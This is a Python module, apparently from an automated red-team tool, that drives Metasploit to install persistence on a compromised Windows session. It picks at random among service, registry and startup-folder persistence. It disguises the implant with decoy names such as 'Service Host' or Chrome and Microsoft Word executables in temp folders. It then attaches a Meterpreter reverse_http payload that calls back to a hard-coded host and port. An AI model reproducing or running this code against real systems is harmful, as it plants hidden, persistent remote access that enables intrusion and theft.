import os
import time
import random
from data.event import EventUtils

class Persistance():

    #service persistence variables
    SERVICE_HOST = "Serivce Host: "
    service_host_names = ["Workstation", "User Manager", "Time Broker", "Themes", "User Profile Service"]
    final_service_host = SERVICE_HOST + random.choice(service_host_names)

    #registry persistence variables
    REGISTRY_NAME = ['Java', 'Word', 'PowerPoint', 'OneDrive']
    SLEEP = random.randint(5,15)
    BLOB_KEY = ['Default', 'Services', 'Army', 'Navy', 'Airforce']

    #persistence variables
    EXE_NAME = ['Chrome', 'FireFox', 'Microsoft Word', 'Microsoft PowerPoint', 'Microsoft Excel']
    COMP_PATH = ['%TEMP%','%ProgramData%', '%LOCALAPPDATA%']
    VBS_NAME = ['InitialStartup', 'AdminStartup', 'StartupScript', 'itScript']


    def __init__(self, msfclient):
        self.msfclient = msfclient

    def persistence_module(self, sessionInput):
        EventUtils.settingEvent(self, "Setting persistence on "+sessionInput+".")
        persistence_exploits = ['windows/local/persistence_service', 'windows/local/registry_persistence', 'windows/local/persistence']
        chosen_persistence = persistence_exploits[random.randint(0,2)]
        exploit = self.msfclient.modules.use('exploit', chosen_persistence)
        if 'service' in chosen_persistence:
            EventUtils.settingEvent(self, "["+sessionInput+"]Setting up persistence in service "+self.final_service_host+".")
            exploit['SERVICE_DESCRIPTION'] = 'Service Host'
            exploit['SERVICE_NAME'] = self.final_service_host
            exploit['RETRY'] = random.randint(10,15)
        if 'registry' in chosen_persistence:
            EventUtils.settingEvent(self, "["+sessionInput+"]Setting up persistence in registry.")
            exploit['BLOB_REG_KEY'] = random.choice(self.BLOB_KEY)
            exploit['BLOB_REG_NAME'] = random.choice(self.REGISTRY_NAME)
            exploit['RUN_NAME'] = random.choice(self.REGISTRY_NAME)
            exploit['SLEEP_TIME'] = self.SLEEP
        if persistence_exploits[2] == chosen_persistence:
            EventUtils.settingEvent(self, "["+sessionInput+"]Setting up persistence locally.")
            exploit['EXE_NAME'] = random.choice(self.EXE_NAME)
            exploit['PATH'] = random.choice(self.COMP_PATH)
            exploit['VBS_NAME'] = random.choice(self.VBS_NAME)
        _payload = self.msfclient.modules.use('payload', 'windows/meterpreter/reverse_http')
        exploit['SESSION'] = sessionInput
        _payload['LHOST'] = "192.168.130.1" # please change this to the correct machine
        _payload['LPORT'] = 8080            # need to change this when switching to different machines
                                            # also need to track it to make sure im not butting heads with anything
        exploit.execute(payload=_payload)
        